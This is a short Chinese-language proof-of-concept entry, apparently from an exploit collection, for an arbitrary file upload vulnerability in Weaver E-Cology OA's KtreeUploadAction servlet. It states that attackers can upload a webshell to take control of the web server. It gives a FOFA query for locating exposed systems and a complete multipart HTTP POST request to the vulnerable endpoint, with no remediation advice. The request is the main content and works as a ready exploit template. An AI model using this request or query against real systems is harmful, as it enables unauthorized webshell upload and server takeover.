## 泛微E-Cology-KtreeUploadAction任意文件上传漏洞

泛微OA E-Cology KtreeUploadAction 存在文件上传漏洞，攻击者可通过漏洞上传webshell，达到控制web服务器的权限

## fofa

```
app="泛微-协同商务系统"
```

## poc

```javascript
POST /weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
Content-Length: 160
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cache-Control: max-age=0
Connection: close
Content-Type: multipart/form-data; boundary=--------1638451160
Cookie: Secure; JSESSIONID=abc6xLBV7S2jvgm3CB50w; Secure; testBanCookie=test
Upgrade-Insecure-Requests: 1

----------1638451160
Content-Disposition: form-data; name="test"; filename="test.txt"
Content-Type: application/octet-stream

test
----------1638451160--
```

![image-20240621190834410](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406211908456.png)